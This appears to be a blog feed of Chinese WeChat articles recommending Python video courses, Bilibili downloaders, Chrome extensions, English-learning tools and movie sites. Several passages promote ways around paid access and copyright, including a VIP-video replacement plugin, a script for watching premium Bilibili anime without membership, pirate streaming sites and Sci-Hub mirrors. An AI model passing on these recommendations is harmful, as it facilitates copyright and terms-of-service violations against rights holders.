，图片地址https://pic4.zhimg.com/v2-15c6c0af0c7227dda092b68d8fc21e0b_xl.jpg它还有3种格式的图片地址：123https://pic4.zhimg.com/v2-15c6c0af0c7227dda092b68d8fc21e0b_xs.jpghttps://pic4.zhimg.com/v2-15c6c0af0c7227dda092b68d8fc21e0b_im.jpghttps://pic4.zhimg.com/v2-15c6c0af0c7227dda092b68d8fc21e0b.jpg 最后这个就是大图。 最近原创文章： 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 那些有趣/实用的 Chrome 扩展神器系列（三） 分享几个学英语的好工具 过年无聊？来b站看豆瓣电影 Top 250 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[建了个微信交流群，和我一起在b站学Python]]></title>
    <url>%2F2021%2F02%2F26%2F%E5%BB%BA%E4%BA%86%E4%B8%AA%E5%BE%AE%E4%BF%A1%E4%BA%A4%E6%B5%81%E7%BE%A4%EF%BC%8C%E5%92%8C%E6%88%91%E4%B8%80%E8%B5%B7%E5%9C%A8b%E7%AB%99%E5%AD%A6Python%2F</url>
    <content type="text"><![CDATA[苏生不惑第220 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前我发过好几篇关于Python的文章： 七夕又来了，给女朋友做个动态二维码 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 一键批量下载抖音无水印视频 如何批量下载知乎回答图片 王菲k歌又上微博热搜，Python分析下微博网友评论 Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 也发过一些Python的广告，今天就和大家一起在b站学Python ，其实b站是个很好的学习网站，上面有很多的免费视频教程，今天分享些b站上的Python视频。 其实Python 是门很老的语言了，发布于1991，都30年了，估计比很多人年龄都大https://developers.slashdot.org/story/21/02/20/0448223/python-turns-30-a-steering-council-member-reflects 零基础入门学习Python小甲鱼的《零基础入门学习Python》https://www.bilibili.com/video/BV1Fs411A7HZ 播放量近200万，共97集（其实也不用看完，前50集就行），每集20分钟左右，近6万弹幕，我用Python抓取了下弹幕生成的词云图： 顺便说下b站还有个记笔记的功能，方便你复习。 Python语言基础与应用北京大学陈斌老师的课程https://www.bilibili.com/video/BV1V741147QH，播放量虽然不高，但质量不错，共58集，每集15分钟左右，弹幕生成的词云图： Python编程从入门到实践https://www.bilibili.com/video/av35698354 主讲是个妹子，声音很好听，播放量65万， 共10集，每集40分钟左右，弹幕生成的词云图。 这可能是你见过的最简洁最没有废话的Python教程https://www.bilibili.com/video/BV1ws411i7Dr ，播放量52万， 共34集，每集10分钟左右，弹幕生成的词云图： 全网最爆笑的Python教程偷着学Python(漫画版) https://www.bilibili.com/video/BV1HK411577E ，播放量13万， 共19集，每集10分钟左右，弹幕生成的词云图： 微软Python编程入门教程微软针对初学者推出的英文视频教程 https://www.bilibili.com/video/BV187411f7z9 ，不过有中文翻译，它还提供中文在线教程 https://docs.microsoft.com/zh-cn/learn/modules/intro-to-python/ ，播放量3万， 共44集，每集5分钟左右，弹幕生成的词云图： 看视频中可能会遇到问题，多查阅下Python官方中文文档 https://docs.python.org/zh-cn/3/ ，很多问题文档里都有答案，另外分享下Pythontab的这张图，看看一个Python脚本是怎么编写的。还有这个一图学Python https://github.com/coodict/python3-in-one-pic ，图片比较大，这里放不下，在公众号后台回复 Python 获取大图。Python 小抄 https://quickref.me/python X分钟速成Python https://learnxinyminutes.com/docs/zh-cn/python-cn/ https://learnxinyminutes.com/docs/files/learnpython-cn.py 当然光看视频是没用的，这个需要手动练习，不过得先有台电脑，之前文章下有人评论说没有电脑 ，这里做个统计，看看多少人没有电脑的，话说现在电脑的价格和好点的手机差不多，我觉得还是很有必要买台电脑的。 最后我建了个Python微信交流群，说实话，一个人学东西很容易从入门到放弃，有问题可以在群里和大家一起交流讨论，如果你对学Python有兴趣加我微信 sushengbuhuo ，我会把二维码发在朋友圈（为什么不直接发这里，很容易进机器人，然后发广告），没兴趣就不用进了，里面也没有红包抢。 附带一个忠告：学了Python不要非法抓取数据，详见爬虫违法违规案例汇总https://github.com/HiddenStrawberry/Crawler_Illegal_Cases_In_China 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[又一视频下载神器，一键下载b站收藏夹视频和up主所有视频]]></title>
    <url>%2F2021%2F02%2F26%2F%E5%8F%88%E4%B8%80%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%8C%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BDb%E7%AB%99%E6%94%B6%E8%97%8F%E5%A4%B9%E8%A7%86%E9%A2%91%E5%92%8Cup%E4%B8%BB%E6%89%80%E6%9C%89%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第219 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过如何找回bilibili(b站)收藏夹里失效的视频？ ，为了以防万一最好把收藏夹的视频都下载了，今天就分享几个好用的工具，同时支持一键下载up主所有视频。 关于b站之前还写过这些文章： 过年无聊？来b站看豆瓣电影 Top 250 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 bilibili(b站)升级到BV号了，还想用av号怎么办？ 如何更优雅地使用 bilibili(b站) 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 没有b站大会员怎么看番剧 如何免登陆观看b站大会员番剧 借用 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 下载b站外挂字幕,用 potplayer 播放视频也能看字幕了 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 话说你的b站账号是什么时候注册的？可以通过b站接口https://member.bilibili.com/x2/creative/h5/calendar/event?ts=0 返回的jointime（时间戳需要转换下）获取，我是2017年注册的。 BiliDuang这是个开源软件https://github.com/kengwang/BiliDuang ， 支持BV， 支持4K， 支持地区限制下载 ，支持互动视频， 支持无水印， 支持弹幕/字幕下载转换， 支持课程下载。 关于无水印的说明：无水印仅针对部分UP主，应该是使用了B站网页投稿而不是客户端。客户端是本地加水印，传到B站服务器的只有 有水印版。不过我下载了几个都不能下载无水印，目前测试通过 https://www.bilibili.com/video/BV15y4y1q77G 无水印 扫码登录后点击自己头像，选择你的收藏夹 ，选择要下载的视频（可全选）。失效的视频也能显示av号。 av8187837 当然也可以直接输入视频地址下载。 https://www.bilibili.com/video/BV1x4411172A下载速度还是很快的。 还支持番剧下载，比如 https://www.bilibili.com/bangumi/play/ep266323 可以下载全部的25集。 设置里可以切换api源。 哔哩下载姬这是个简单易用的哔哩哔哩视频下载工具，具有简洁的界面，流畅的操作逻辑，可以下载几乎所有的B站视频，并输出mp4格式的文件，采用Aria下载器多线程下载， FFmpeg对视频进行混流、提取音视频等操作https://github.com/FlySelfLog/downkyi （如果下载慢在公众号后台回复 b站 获取下载地址） 输入up主页地址下载 https://space.bilibili.com/2026561407工具箱还有去水印功能。 下载的视频为mp4格式文件。 登录账号后同样可以下载收藏夹的视频。 闪豆视频下载器这个工具和上面的功能差不多，就不多介绍了。还支持搜索视频。最后分享个新发现的命令行下载工具 。 B站视频下载器这是go开发的工具 https://github.com/sodaling/FastestBilibiliDownloader ，由于墙的原因需要设置代理，linux下 export GOPROXY=https://goproxy.io，Windows 用户Win+R输入powershell，在PowerShell中设置GOPROXY环境变量$env:GOPROXY = &quot;https://goproxy.io&quot; 通过视频的aid下载单个视频，通过up主的id(b站叫mid)下载这个up主所投稿的所有视频。 比如视频https://www.bilibili.com/video/BV1Ya4y1e7Go 的avid为668267068 还有up主id https://space.bilibili.com/2026561407很快下载完了。 goannie这是个基于annie的命令行下载工具https://gitee.com/rock_rabbit/goannie ，支持bilibili，腾讯，抖音，爱奇艺，西瓜，火锅，好看等视频网站。 输入视频地址下载，如果需要登录才能下载可以添加个cookie文件。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣/实用的 Chrome 扩展神器系列（三）]]></title>
    <url>%2F2021%2F02%2F26%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3-%E5%AE%9E%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第218 篇原创文章，将本公众号设为星标，第一时间看最新文章。 话说没有安装扩展的浏览器是没有灵魂的，之前分享过几篇关于Chrome扩展的文章： 上不了谷歌如何安装 Chrome 扩展？ 分析你的浏览器历史记录，看看你喜欢访问哪些网站 微软 edge 浏览器如何安装扩展 谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？ 不会 Python 没关系，手把手教你用 web scraper 抓取豆瓣电影 top 250 和 b 站排行榜 那些有趣/实用的 Chrome 扩展神器 那些有趣/实用的 Chrome 扩展神器系列（二） 今天继续分享系列第3篇。 下载扩展crx文件之前文章分享过备份Chrome扩展那些你可能不知道的谷歌浏览器实用技巧，不过比较麻烦，有了这个扩展就方便多了，在谷歌商店详情页直接右键导出crx文件，Chrome扩展地址https://chrome.google.com/webstore/detail/get-crx/dijpllakibenlejkbajahncialkbdkjc/ 不过下载的crx文件现在不能直接拖入扩展程序安装，其实浏览器只是默认隐藏了拖入安装 .crx 扩展功能，打开 chrome://flags/#extensions-on-chrome-urls 将 Disabled 改为 Enabled，重启浏览器就行了。 然后在浏览器扩展页面 chrome://extensions/ 开启开发者模式，直接拖入 .crx 扩展文件即可安装。 ruffle 自 2021 年起，Adobe 已停止为 Flash Player 插件提供支持。在任何版本的 Chrome 中，Flash 内容（包括音频和视频）都将无法再正常播放 https://support.google.com/chrome/answer/6258784?hl=zh-Hans 以上内容来自谷歌，flash已经退出历史舞台，不过还有些网站依赖flash，不能用怎么办呢？可以试试这个开源扩展 https://github.com/ruffle-rs/ruffle/releases/ ，下载zip文件后打开扩展程序直接拖进去安装。 不过目前ruffle还不成熟，不能兼容所有flash组件。 哔哩哔哩弹幕过滤器瞬间过滤B站的刷屏弹幕，还你清爽的弹幕视频体验， Chrome扩展地址https://chrome.google.com/webstore/detail/pakku%EF%BC%9A%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%E5%BC%B9%E5%B9%95%E8%BF%87%E6%BB%A4%E5%99%A8/jklfcpboamajpiikgkbjcnnnnooefbhh 歌曲搜索试听和在线广播一个直接搜歌即可听歌的工具，不用在网易云音乐和QQ之间切换，可以看成 Listen 1的简洁版，而且还能听广播，Chrome扩展地址https://chrome.google.com/webstore/detail/search-to-play-the-song/anfmgjkkbagjfdejhbjdiapgkbhpigpm如果想下载音乐可以使用音乐识别下载器 https://chrome.google.com/webstore/detail/%E9%9F%B3%E4%B9%90%E8%AF%86%E5%88%AB%E4%B8%8B%E8%BD%BD%E5%99%A8/elnlodchelennijomigiblbjekdihhgo?hl=zh-CN ，它支持在线解析各大音乐网站如网易云音乐、唱吧、全民k歌、QQ音乐、酷狗、酷我的音乐、咪咕音乐,喜马拉雅音乐，无需下载客户端一键下载。 或者扩展程序进入视图，选择歌时会有新的请求，其中.mp3结尾的就是歌曲的真实地址，可以直接下载。 浮图秀这是一款帮助用户快速查看页面中缩略图对应大图的浏览器插件，用户鼠标悬停在缩略图时即可看到相应的高分辨率图片，目前支持的网站有京东、天猫、淘宝、知乎、微博等80余个网站，Chrome扩展地址https://chrome.google.com/webstore/detail/photoshow/mgpdnhlllbpncjpgokgfogidhoegebod/ 多账号登录同时使用多个帐号登录浏览网站，不用安装多个浏览器了，点击一下按钮即可创建一个独立标签，Chrome扩展地址https://chrome.google.com/webstore/detail/sessionbox-multi-login-to/megbklhjamjbcafknkgmokldgolkdfig 识别二维码现在谷歌浏览器已经自带生成二维码功能了（见之前文章谷歌浏览器那些有趣的隐藏功能），不过这个扩展还可以将文本、链接、图片生成二维码，也能识别二维码图片，不用打开微信扫一扫了，Chrome扩展地址https://chrome.google.com/webstore/detail/qr-code-generator-and-rea/hkojjajclkgeijhcmfjcjkddfjpaimek 下载管理接管谷歌浏览器自带的下载功能，免去打开下载页面来查看下载文件的麻烦，Chrome扩展地址https://chrome.google.com/webstore/detail/%E4%B8%8B%E8%BD%BD%E7%AE%A1%E7%90%86/dgoaeahpciglgomkbmfblkcfanpfckhb 目前功能有：接管浏览器下载功能、显示下载速度、进度、打开文件、所在目录、删除文件（删除记录和文件）、重新下载、删除下载记录（不删除文件）、按文件名搜索、清空下载记录等。 scihub 论文可用网址scihub 应该很多学生/科研人员会用到，不过网址经常挂，Sci-Hub X Now! 这个扩展在选项页 chrome://extensions/?options=gmmnidkpkgiohfdoenhpghbilmeeagjj 会有 6 个可用的 sci-hub 地址，Chrome扩展地址 https://chrome.google.com/webstore/detail/sci-hub-x-now/gmmnidkpkgiohfdoenhpghbilmeeagjj ，当然也可以收藏这个网站 https://www.sci-hub.pub/ 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[把英语捡起来：分享几个学英语的好工具]]></title>
    <url>%2F2021%2F02%2F26%2F%E6%8A%8A%E8%8B%B1%E8%AF%AD%E6%8D%A1%E8%B5%B7%E6%9D%A5%EF%BC%9A%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%AD%A6%E8%8B%B1%E8%AF%AD%E7%9A%84%E5%A5%BD%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第217篇原创文章，将本公众号设为星标，第一时间看最新文章。 今天大年初七了，春节假期就结束了，又要上班了，加油，打工人。 之前分享过翻译工具那些好用的翻译工具 ，今天分享几个学英语的好工具 。 听力练习https://www.youzack.com/ListeningExercise/ListeningIndex/ 这个网站虽然粗糙，不过很实用。逐句听大学英语四级，上面是音频（可以用idm下载），下面有字幕提示。 划词翻译Chrome扩展一个有趣的英语学习扩展，支持划词翻译、单词高亮、单词弹幕、记忆曲线复习、词频统计，根据遗忘曲线在网页上生成单词弹幕，时刻有学习的感觉https://github.com/jiangqizheng/BlueSea ，安装Chrome扩展很简单，之前文章已经介绍过了上不了谷歌如何安装 Chrome 扩展？ 。选中网页的英文后收藏，点击扩展可以看到收藏过的单词。它会在网页中弹出提醒你。 如果需要调整可以修改设置。 单词记忆这是个为键盘工作者设计的单词记忆工具 https://kaiyiwing.gitee.io/qwerty-learner/ ，键盘输入单词（有朗读音）正确后跳入下个单词，它会统计时间，速度，正确数和正确率等数据。可以自行选择词典库。 看视频学英语这是一个看电视频学英语的助手工具 https://www.babelabc.com ，比如经典的《老友记》。最后分享几个学英语的APP （公众号后台回复 英语 获取软件）。 多邻国练习口语，阅读，听力和写作技巧，通过回答问题完成课程，提高词汇和语法技能。学生和白领必备的英语学习神器可可英语。当然学英语最重要的还是坚持，很多人会半途而废（包括我），如果你能跟这位up主一样每天雷打不动早上8点更新视频学习英语，一个月后你可能会很惊讶自己的改变 https://space.bilibili.com/12359115 最近文章： 过年无聊？来b站看豆瓣电影 Top 250 要过年了，换个发微信红包新姿势 好玩的微信状态视频合集整理（附无水印视频网盘链接） 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过年无聊？来b站看豆瓣电影 Top 250]]></title>
    <url>%2F2021%2F02%2F26%2F%E8%BF%87%E5%B9%B4%E6%97%A0%E8%81%8A%EF%BC%9F%E6%9D%A5b%E7%AB%99%E7%9C%8B%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1-Top-250%2F</url>
    <content type="text"><![CDATA[苏生不惑第216篇原创文章，将本公众号设为星标，第一时间看最新文章。 今天就是大年初四了，祝大家新年快乐，这里分享些不错的影视剧，如果过年在家无聊可以看看。 关于影视剧之前也分享过文章： 如何更优雅地看电影/刷剧 如何根据台词找到对应电影片段 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 2020 最全百度网盘搜索，找电影资源不再愁 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 CCTV不知道你是否看了今年的春晚，都说现在的春晚小品越来越让人笑不起来了，还好可以在CCTV重温下曾经那些经典的小品，比如陈佩斯和朱时茂的《吃面条》http://tv.cctv.com/2009/11/11/VIDE1355602688311339.shtml b站b站出了个2020年度电影https://www.bilibili.com/blackboard/topic/activity-RZk8disok.html还有b站能看的豆瓣电影top 250里的49部 https://www.bilibili.com/bangumi/list/sl17834 https://github.com/Mayandev/douban250-in-bilibili ，如果需要大会员可以看看之前文章 没有b站大会员怎么看番剧 顺便说下b站的一起看 功能，创建放映室成为放映员，可以选片播放、控制影片播放进度，将放映室的链接分享给好友，最多支持8位用户一起同步看视频、聊天，简直异地恋情侣的福音。 @苏生不惑 邀请你一起来看《让子弹飞》。点击链接立刻加入ta的放映室吧–哔哩哔哩放映室 https://b23.tv/g4PrBc 分享个Chrome插件直接替换VIP视频大侠助手 https://wwi.lanzous.com/izAJmjqxcje 密码:9h7y ，比如看爱奇艺的 《武林外传》 https://www.iqiyi.com/v_19rrk2h45c.html 如果看不了可以用这个在线m3u8播放 http://hunlongyu.gitee.io/zy-player-web/ ，输入m3u8地址即可播放影视资源。https://hls.cntv.myalicdn.com/asp/hls/2000/0303000a/3/default/4ec8c6c1bdd941b0b11280769b036e8b/2000.m3u8?maxbr=2048 https://github.com/cuiocean/ZY-Player 如果想在线看剧推荐电影狗和 影视森林。 电影狗电影狗是第三方网页索引搜索工具，集合了很多网站资源 http://www.dianyinggou.com/比如电影《情圣》的播放源有很多。 影视森林这是个影视网站聚合站，再也不用收藏那么多网站了 http://549.tv/ 最后推荐一部值得看的剧 《山海情》，豆瓣评分9.4 https://movie.douban.com/subject/35033654/ 一共23集，如果没时间看完可以看看大象放映室的解说https://www.bilibili.com/video/BV1Ey4y1Y7fj 或者木鱼水心解说https://www.bilibili.com/video/BV1nA411M7c3 另外分享下豆瓣电影 top 250 https://movie.douban.com/top250，都是经典之作（公众号后台回复 电影 获取网盘地址），250部电影够看很久了，很多电影也值得看多遍 。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021大年初一领红包，恭喜发财，大吉大利]]></title>
    <url>%2F2021%2F02%2F26%2F2021%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80%E9%A2%86%E7%BA%A2%E5%8C%85%EF%BC%8C%E6%81%AD%E5%96%9C%E5%8F%91%E8%B4%A2%EF%BC%8C%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%2F</url>
    <content type="text"><![CDATA[今天就是牛年大年初一了，这里给大家拜年了：新年进步，恭喜发财，一帆风顺，身体健康，事事如意，龙马精神，如意吉祥，大吉大利。 祝福语来自电影《甜蜜蜜》，我觉得挺好的，欢迎转发视频号到朋友圈。 公众号后台回复 支付宝 领取支付宝口令红包，手慢无。 另外发个88的抽奖红包，公众号后台回复中奖参与，2月14日开奖。 由于疫情的原因今年没有回家过年，看新闻说有1亿人原地过年，长这么大第一次在外过年，今年的除夕年夜饭是外卖，因为自己不会做饭，周围的饭店都回家过年了，估计未来一周都要靠外卖了。 今年你在哪过年？有什么新年愿望，可以在评论区说说，我的愿望就是赚钱多多。 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[要过年了，换个发微信红包新姿势]]></title>
    <url>%2F2021%2F02%2F10%2F%E8%A6%81%E8%BF%87%E5%B9%B4%E4%BA%86%EF%BC%8C%E6%8D%A2%E4%B8%AA%E5%8F%91%E5%BE%AE%E4%BF%A1%E7%BA%A2%E5%8C%85%E6%96%B0%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[苏生不惑第215篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过好几篇文章了： 你刚才微信上撤回了什么？我都看到了 微信支付分开通了，来看看你有多少分 c 盘空间又满了？微信清理神器帮你释放空间 如何导出你的微信语音 一键生成你的微信社交数据报告 如何发一条九宫格图片的朋友圈 集赞生成器：朋友圈集赞不求人 不为人知的几个微信实用技巧 后天就过年了，今天分享下发微信红包的新姿势。 滚动数字红包先在公众号后台回复 红包 获取滚动表情，然后微信里添加表情。 发红包的时候选择已有表情，然后选择刚加的滚动表情。 点开红包的效果见我录制的GIF图，可以看到数字在滚动，貌似在抢未知金额的红包。 专属红包微信最新版可以在群里发专属红包，不用怕被其他人抢了。点击红包提示仅苏生可领取这个红包，可以在群里秀恩爱了。 红包封面最近几天是不都在抢红包封面，现在可以自己免费做一个自己的红包封面了， 发红包的时候点击下面的提示：限时活动，制作我的红包封面，也可以直接点这个链接 https://cover.weixin.qq.com/cgi-bin/mmcover-bin/readtemplate?t=page/mobile.html 。条件很简单，只要你开通了视频号，且有一条视频点赞超过10，就可以制作自己的红包封面了。 大家顺便关注下我的视频号，每天更新好玩的视频好玩的微信状态视频合集整理（附无水印视频网盘链接） 微信昵称旁加福字在微信搜索点亮2021点击进入直播间，在下方许愿输入你的新年愿望即可点亮福，详情见微信派的文章@微信官方，给我微信旁边加个福字 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（十）]]></title>
    <url>%2F2021%2F02%2F10%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%8D%81%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第214篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 那些有趣的网站系列（七） 那些有趣的网站系列（八） 那些有趣的网站系列（九） 这是系列第10篇。 凡尔赛语录最近微博上凡尔赛风行，来看看大神们怎么优雅的装逼https://versailles.deno.js.cn/ 你的名字用诗经, 楚辞, 唐诗宋词起名字，可以先给孩子准备个好名字http://xiaosang.net/gushi_namer/ 中文词汇量测试九年义务教育查漏补缺，看看你的中文词汇量有多少？https://www.arealme.com/chinese-vocabulary-size-test/cn/ 我测试了下，确认没还给语文老师。 森林之声听森林里的鸟叫，人物对话声，很有生活气息 https://www.tree.fm/forest/20 微博切九图将一张图切成9张小图，适合发在微博，朋友圈 https://lab.magiconch.com/v/sns-image 错误英语这个网站整理了在广告设计和产品包装中出现的各种令人捧腹的错误英语 ，还专门有个中国式英语栏目 https://www.engrish.com/ ，小心落石应该怎么翻译好呢？ 在线健身100个健身APP可能敌不过1个网站，在线教你科学的练习每块肌肉（分男女） https://musclewiki.cn/ 数学公式转换可以把截图中的数学公式识别出来转换成 latex 代码https://mathcode.herokuapp.com/ ，比如高斯积分 $\int_{-\infty}^{\infty} e^{-x^{2}} d x=\sqrt{\pi}$转换后的latex 代码可复制到LaTeX公式编辑器 https://www.latexlive.com/ 再转换回去。 胡编生成器一秒钟给你胡编生成一篇水文https://disksing.com/sao-gen-gen/2 合成大西瓜最近火热的合成大西瓜游戏玩过吗？http://game.cn1.utools.club/hcdxg-game/index.htm 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最新做微信状态视频背景的视频合集整理（附无水印视频网盘链接）]]></title>
    <url>%2F2021%2F02%2F10%2F%E6%9C%80%E6%96%B0%E5%81%9A%E5%BE%AE%E4%BF%A1%E7%8A%B6%E6%80%81%E8%A7%86%E9%A2%91%E8%83%8C%E6%99%AF%E7%9A%84%E8%A7%86%E9%A2%91%E5%90%88%E9%9B%86%E6%95%B4%E7%90%86%EF%BC%88%E9%99%84%E6%97%A0%E6%B0%B4%E5%8D%B0%E8%A7%86%E9%A2%91%E7%BD%91%E7%9B%98%E9%93%BE%E6%8E%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[关注公众号后在公众号后台回复 状态 获取无水印网盘链接。 文章开始前说下之前文章 2021 年 2 月福利，小伙伴们来领微信红包 ，有人反馈统计不对，因为有人改过昵称，导致分成2个账号统计，这个目前也没有办法，人数比较多，我也没办法去核实，大家理解下。 最近微信上线了8.0版本，除了好友数突破 1万人，其中一个意思的功能就是增加了微信状态（在朋友圈 –&gt;状态 可以看到你之前设置的动态）。话说功能是不有点类似QQ。而且还可以添加视频状态，比如加个动漫《你的名字》。 点击下方视频号可以查看效果（微信里打开）。 还有很多视频状态在不断更新，我都整理好分享到百度网盘了，都是无水印的，麻烦大家关注下这个视频号《我们都爱听老歌》私信我获取网盘地址，等关注人数到1000可以认证，给大家免费发红包封面。 今天（2月3日）打开微信搜索领取红包封面， 9点搜索斗地主,10点搜索游云南,阴阳师，第五人格,天刀,11点搜索 龙门石窟，12点搜索携程,肯德基,19点搜索 马蜂窝。 再分享几个之前发过的视频号动态《言叶之庭》 《灌篮高手》 《哆啦A梦》 《猫和老鼠》 《秒速五厘米》 《起风了》 《天气之子》 《头文字D》 《八戒，你就知道吃，烦死了》 另外还有个实用功能就是图片提取文字，也就是常说的ocr。识别效果还是不错的。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自动跳过 APP 启动广告]]></title>
    <url>%2F2021%2F01%2F29%2F%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BF%87-APP-%E5%90%AF%E5%8A%A8%E5%B9%BF%E5%91%8A%2F</url>
    <content type="text"><![CDATA[苏生不惑第213 篇原创文章，将本公众号设为星标，第一时间看最新文章。 话说上周刚写 今年还能回家过年吗？查询下各地出行隔离政策 ，本来还有点希望，没想过几天就是返乡需持7日内核酸阴性证明，返乡后实行14天居家健康监测，每7天开展一次核酸检测，今年只能北京过年了。 之前分享过去网页广告如何去除烦人的垃圾广告，这里再分享下去APP 启动广告，现在的APP启动广告是越来越迷惑了，比如这种提示未发现网络，你点刷新就跳进广告了，真让人防不胜防。一般启动广告是5秒，比如这种，有些APP每次启动都出广告，简直了。 这里要提下微信万年不变的启动页，难得几个没有启动广告的APP，以微信10亿级的量，如果加启动广告应该能增加不菲的收益，这么多年一直不变，难到这就是张小龙说的克制。 前几天微信刚更新了8.0，好友数可以突破1万人了，以前超过 5000 人之后再加的好友就看不到朋友圈动态，现在提升到1万，安卓版本还没上线，点击文末阅读原文安装内测版吧。https://support.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index&amp;clientversion=&amp;wx_header=0 AdGuard这是个超强的广告拦截工具，它适用于多个平台，在Windows、macOS、Android和iOS四个平台上都有对应的产品 https://adguard.com/zh_cn/welcome.html ，可有效的拦截所有网页上的所有类型的广告。Chrome扩展很好用 https://chrome.google.com/webstore/detail/adguard-adblocker/bgnkhhnnamicmpeenaelnjfhikgbkllg?hl=zh-CN ，不过APP还是推荐下面2个。 自动跳过听名字就知道这个APP干什么的，安装后服务默认关闭的（公众号后台回复 广告 获取APP），需要手动开启。在无障碍里开启，可能每个手机位置不一样 。开启的时候会提示，确定就行。 一指禅使用下来这个APP更好用点，测试下来微博，知乎跳过广告都没问题，它还有日志记录。 微信自动抢红包谨慎使用。不过需要在应用启动管理里关闭自动管理改为手动管理，否则总会被系统关闭。 最后分享个安卓APK提取器，手机中的绝版软件想分享给别人却找不到安装包？它可以直接提取apk安装包 https://wwx.lanzoux.com/iBm0Vkslyyh 最近原创文章： 没有b站大会员怎么看番剧 那些好玩的生成器网站（三） 用 Python 抓取我常看的几个公众号 虾米音乐关闭后还有什么好用的音乐软件？ 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[没有b站大会员怎么看番剧]]></title>
    <url>%2F2021%2F01%2F29%2F%E6%B2%A1%E6%9C%89b%E7%AB%99%E5%A4%A7%E4%BC%9A%E5%91%98%E6%80%8E%E4%B9%88%E7%9C%8B%E7%95%AA%E5%89%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第212 篇原创文章，将本公众号设为星标，第一时间看最新文章。 b站上番剧资源非常丰富 https://www.bilibili.com/anime/ ，不过某些剧需要大会员，还限制了地区播放，比如最近大热的《进击的巨人》https://www.bilibili.com/bangumi/play/ss37757 之前分享过文章如何免登陆观看b站大会员番剧 ，安装个油猴脚本即可观看（公众号后台回复 b站 获取脚本）。 不过这样还是有点麻烦，而且速度慢，这里分享几个看番剧的好网站。 哔咪动漫http://www.bimiacg.com 这个网站界面和b站类似，不过这个网站广告多，而且还禁止右键复制，推荐安装这个油猴脚本 https://greasyfork.org/zh-CN/scripts/391325 去除广告，还原鼠标样式，删除伪搜索历史框 。看番剧速度不错，还有弹幕。 樱花动漫https://www.6111.tv/video/32654-1-5.html http://www.yhdm.io/ 这个网页版和哔咪动漫差不多。http://www.yhdm.io/v/4640-6.html它还有安卓APP （公众号后台回复 